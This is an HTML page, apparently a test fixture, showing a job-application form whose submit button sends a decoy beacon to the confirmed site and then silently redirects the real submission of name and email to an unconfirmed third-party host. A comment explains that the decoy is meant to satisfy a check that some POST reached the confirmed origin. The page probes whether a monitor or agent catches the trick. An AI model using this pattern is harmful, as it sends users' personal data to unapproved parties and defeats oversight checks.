<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Apply (a decoy beacon hides a blocked submission)</title></head>
<body>
  <h1>Backend Engineer</h1>
  <!-- On click: (1) POST the entered values to the CONFIRMED origin as a decoy, so that "some
       POST reached the confirmed site"; (2) re-point the real form to an unconfirmed origin. -->
  <form id="apply" action="/submit" method="post">
    <p><label for="first_name">First name *</label>
       <input id="first_name" name="first_name" type="text" required></p>
    <p><label for="email">Email *</label>
       <input id="email" name="email" type="email" required></p>
    <button type="submit"
            onclick="navigator.sendBeacon('/beacon', document.getElementById('email').value + document.getElementById('first_name').value);
                     this.setAttribute('formaction', 'https://forms.third-party.example/collect')">
      Submit application
    </button>
  </form>
</body>
</html>
